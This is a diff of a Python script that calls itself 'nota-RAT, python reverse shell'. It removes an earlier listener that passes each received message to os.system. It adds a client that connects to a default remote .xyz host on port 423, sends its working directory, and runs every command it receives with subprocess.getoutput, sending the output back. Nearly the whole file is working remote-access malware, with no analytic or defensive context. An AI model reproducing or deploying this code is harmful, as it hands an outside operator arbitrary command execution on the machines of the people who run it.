@@ -1,44 +1,47 @@
-import socket 
-import threading
+import socket
 import os
-
-HEADER = 64
-PORT = 420
-SERVER = socket.gethostbyname(socket.gethostname())
-ADDR = (SERVER, PORT)
-FORMAT = 'utf-8'
-DISCONNECT_MESSAGE = "!DISCONNECT"
-
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind(ADDR)
-
-def handle_client(conn, addr):
-    print(f"[NEW CONNECTION] {addr} connected.")
-
-    connected = True
-    while connected:
-        msg_length = conn.recv(HEADER).decode(FORMAT)
-        if msg_length:
-            msg_length = int(msg_length)
-            msg = conn.recv(msg_length).decode(FORMAT)
-            if msg == DISCONNECT_MESSAGE:
-                connected = False
-
-            os.system(f"{msg}")
-            conn.send("command received".encode(FORMAT))
-
-    conn.close()
-        
-
-def start():
-    server.listen()
-    print(f"[LISTENING] Server is listening on {SERVER}")
-    while True:
-        conn, addr = server.accept()
-        thread = threading.Thread(target=handle_client, args=(conn, addr))
-        thread.start()
+import subprocess
+import sys
+import argparse
 
 
+parser = argparse.ArgumentParser(
+    description="nota-RAT, python reverse shell using sockets."
+)
 
-print("[STARTING] server is starting...")
-start()
+parser.add_argument("host", default= "xn--6pw65a019d.xyz", nargs="?", help="Address of the Server.")
+
+parser.add_argument(
+    "-p", "--port", default=423, help="Port the Server is running on.", type=int
+)
+
+args = parser.parse_args()
+SERVER_HOST = args.host
+SERVER_PORT = args.port
+BUFFER_SIZE = 1024 * 128 
+SEPARATOR = "<sep>"
+
+
+s = socket.socket()
+s.connect((SERVER_HOST, SERVER_PORT))
+cwd = os.getcwd()
+s.send(cwd.encode())
+
+while True:
+    command = s.recv(BUFFER_SIZE).decode()
+    splited_command = command.split()
+    if command.lower() == "exit":
+        break
+    if splited_command[0].lower() == "cd":
+        try:
+            os.chdir(' '.join(splited_command[1:]))
+        except FileNotFoundError as e:
+            output = str(e)
+        else:
+            output = ""
+    else:
+        output = subprocess.getoutput(command)
+    cwd = os.getcwd()
+    message = f"{output}{SEPARATOR}{cwd}"
+    s.send(message.encode())
+s.close()
